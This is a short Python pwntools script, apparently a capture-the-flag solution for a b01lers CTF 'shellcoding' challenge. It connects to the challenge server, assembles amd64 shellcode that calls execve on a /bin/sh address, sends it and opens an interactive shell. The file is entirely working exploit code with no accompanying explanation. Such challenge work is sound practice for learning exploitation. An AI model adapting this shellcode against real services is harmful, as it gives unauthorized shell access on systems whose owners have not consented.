#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#Addr
binsh = 0x4011b3

#Exploit
if __name__ == '__main__':
	io = remote('chal.ctf.b01lers.com',1007)
#	io = process('./shellcoding-5f75e03fd4f2bb8f5d11ce18ceae2a1d')
	shellcode = asm(f'''
		mov rdi, {binsh}
		push rax
		pop rsi
		push rax
		pop rdx
		push 0x3b
		pop rax
		syscall
	''',arch='amd64')
	io.recvline()
	pause()
	io.send(shellcode)
	io.interactive()
